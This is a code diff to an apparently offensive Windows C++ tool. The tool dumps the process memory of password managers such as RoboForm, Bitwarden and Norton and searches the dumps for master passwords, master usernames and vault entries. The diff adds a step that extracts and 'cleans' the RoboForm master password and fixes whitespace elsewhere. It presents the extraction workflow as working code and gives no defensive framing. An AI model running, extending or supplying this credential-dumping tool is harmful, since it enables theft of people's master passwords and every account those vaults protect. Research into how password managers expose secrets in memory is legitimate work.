@@ -35,6 +35,7 @@
 #include "../roboform/app/getCredsroboformapp.h"
 #include "../roboform/app/getCredsroboformapp2.h"
 #include "../roboform/app/getCredsroboformapp3.h"
+#include "../roboform/app/getCredsroboformapp4.h"
 #include "../bitwarden/plugin/getCredsbitwardenPluginChrome.h"
 #include "../bitwarden/plugin/getCredsbitwardenPluginChrome2.h"
 #include "../bitwarden/app/getCredsbitwardenApp1.h"
@@ -84,7 +85,7 @@ int checkApps() {
     std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, firefox, ironvest, kaspersky, keeper,\n";
     std::cout << "nordpass, lastpass, msedge, norton, passwarden, passwordboss, roboform ): ";
     std::cin >> userInput;
-    
+
     wchar_t currentDir[MAX_PATH];
 
     if (mode == "local") {
@@ -101,7 +102,7 @@ int checkApps() {
             mergeFiles();
             fileInput = "app.dmp";
         }
-       
+
     }
 
 
@@ -144,8 +145,8 @@ int checkApps() {
         }
 
         if (mode == "full") {
- 
-             pids = FindPIDsByProcessName(processName);
+
+            pids = FindPIDsByProcessName(processName);
 
             for (DWORD pid : pids) {
                 std::wcout << L"Process PID: " << pid << std::endl;
@@ -175,7 +176,7 @@ int checkApps() {
             if (mode == "fast") {
                 processName = "chrome.exe";
                 // Step 1: Find PIDs by process name
-               pids = FindPIDsByProcessName(processName);
+                pids = FindPIDsByProcessName(processName);
 
                 if (!pids.empty())
                 {
@@ -580,7 +581,7 @@ int checkApps() {
                 return 1;
             }
 
-         
+
             std::cout << "Provide the browser (e.g., firefox, chrome): ";
             std::string browserInput;
             std::cin >> browserInput;
@@ -945,11 +946,17 @@ int checkApps() {
             std::cout << "Roboform contains all relevant credentials (master pass, entries, etc.).\n";
 
             if (mode == "local") {
-                std::cout << "Searching for entries (1/2).\n";
+                std::cout << "Searching for entries (1/4).\n";
                 getCredsroboformapp(fileInput);
                 std::cout << "Done!\n";
-                std::cout << "Searching for master password (2/2).\n";
+                std::cout << "Searching for master username (2/4).\n";
+                getCredsroboformapp3(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "Searching for master password (3/4).\n";
                 getCredsroboformapp2(fileInput);
+                std::cout << "Done!\n";
+                std::cout << "Cleaning master password (4/4).\n";
+                getCredsroboformapp4(fileInput);
                 std::cout << "Done!\n";
             }
             else if (mode == "fast" || mode == "full") {
@@ -962,23 +969,26 @@ int checkApps() {
 
                 if (pid != 0)
                 {
-                    // Step 2: Create a dump file for the process with the second-largest size
+                    // Step 2: Create a dump file for the process with the first-largest size
                     saveDump(pid);
                 }
                 else
                 {
                     std::cerr << "No process with this PID found." << std::endl;
                 }
-                std::cout << "Searching for entries (1/3).\n";
+                std::cout << "Searching for entries (1/4).\n";
                 getCredsroboformapp(fileInput);
                 std::cout << "Done!\n";
-                std::cout << "Searching for master username (2/3).\n";
+                std::cout << "Searching for master username (2/4).\n";
                 getCredsroboformapp3(fileInput);
                 std::cout << "Done!\n";
-                std::cout << "Searching for master password (3/3).\n";
+                std::cout << "Searching for master password (3/4).\n";
                 getCredsroboformapp2(fileInput);
                 std::cout << "Done!\n";
-                
+                std::cout << "Cleaning master password (4/4).\n";
+                getCredsroboformapp4(fileInput);
+                std::cout << "Done!\n";
+
             }
             std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
         }
@@ -1007,7 +1017,7 @@ int checkApps() {
                     std::wcout << L"Stop execution.\n" << std::endl;
                     return 1;
                 }
-                }
+            }
             else {
                 std::wcerr << L"Failed to get the current user's login name." << std::endl;
                 return 1;
@@ -1059,10 +1069,10 @@ int checkApps() {
             getCredsroboformplugin(fileInput);
             std::cout << "Done!\n";
             std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
-            }
+        }
     }
 
-    
+
     //bitwarden
     if (userInput == "bitwarden") {
         std::cout << "User input matches 'bitwarden'.\n";
@@ -1158,62 +1168,62 @@ int checkApps() {
 
         if (userInput2 == "1") {
 
-                std::cout << "For this app, the first largest process is needed.\n";
-                std::cout << "The master password and username (email address) should be available.\n";
-                std::cout << "It should be noted that the app clears master password from the memory after some time (appox. 10 min).\n";
-                const char* processName = "Bitwarden.exe";
+            std::cout << "For this app, the first largest process is needed.\n";
+            std::cout << "The master password and username (email address) should be available.\n";
+            std::cout << "It should be noted that the app clears master password from the memory after some time (appox. 10 min).\n";
+            const char* processName = "Bitwarden.exe";
 
-               // Step 1: Find PIDs by process name
-                std::vector<DWORD> pids;
+            // Step 1: Find PIDs by process name
+            std::vector<DWORD> pids;
 
-                if (mode == "fast") {
+            if (mode == "fast") {
 
-                    pids = FindPIDsByProcessName(processName);
+                pids = FindPIDsByProcessName(processName);
 
-                    if (!pids.empty())
+                if (!pids.empty())
+                {
+                    // Step 2: Get Private Working Set sizes for the found PIDs
+                    std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                    // Step 3: Find the PID with the first-largest Private Working Set size
+                    DWORD firstLargestPID = FindFirstPID(pidSizePairs);
+
+                    if (firstLargestPID != 0)
                     {
-                        // Step 2: Get Private Working Set sizes for the found PIDs
-                        std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
-
-                        // Step 3: Find the PID with the first-largest Private Working Set size
-                        DWORD firstLargestPID = FindFirstPID(pidSizePairs);
-
-                        if (firstLargestPID != 0)
-                        {
-                            // Step 4: Create a dump file for the process with the first-largest size
-                            saveDump(firstLargestPID);
-                        }
-                        else
-                        {
-                            std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
-                        }
+                        // Step 4: Create a dump file for the process with the first-largest size
+                        saveDump(firstLargestPID);
                     }
                     else
                     {
-                        std::cerr << "No processes with the specified name found." << std::endl;
+                        std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                     }
-                    fileInput = "app.dmp";
                 }
-
-                if (mode == "full") {
-                    pids = FindPIDsByProcessName(processName);
-
-                    for (DWORD pid : pids) {
-                        std::wcout << L"Process PID: " << pid << std::endl;
-                        createFileFromMultiPIDs(pid);
-                    }
-
-                    fileInput = "app.dmp";
+                else
+                {
+                    std::cerr << "No processes with the specified name found." << std::endl;
                 }
-
-                std::cout << "Searching for master password (1/2).\n";
-                getCredsbitwardenApp1(fileInput);
-                std::cout << "Done!\n";
-                std::cout << "Searching for master username (2/2).\n";
-                getCredsbitwardenApp2(fileInput);
-                std::cout << "Done!\n";
-                std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+                fileInput = "app.dmp";
             }
+
+            if (mode == "full") {
+                pids = FindPIDsByProcessName(processName);
+
+                for (DWORD pid : pids) {
+                    std::wcout << L"Process PID: " << pid << std::endl;
+                    createFileFromMultiPIDs(pid);
+                }
+
+                fileInput = "app.dmp";
+            }
+
+            std::cout << "Searching for master password (1/2).\n";
+            getCredsbitwardenApp1(fileInput);
+            std::cout << "Done!\n";
+            std::cout << "Searching for master username (2/2).\n";
+            getCredsbitwardenApp2(fileInput);
+            std::cout << "Done!\n";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+        }
 
     }
 
@@ -1342,7 +1352,7 @@ int checkApps() {
         }
 
         if (mode == "local") {
-            
+
             std::cout << "Searching for entries (1/2).\n";
             getCredsnorton(fileInput);
             std::cout << "Done!\n";
@@ -1472,7 +1482,7 @@ int checkApps() {
             return 1;
         }
 
-     
+
         // Step 1: Find PIDs by process name
         std::vector<DWORD> pids;
 
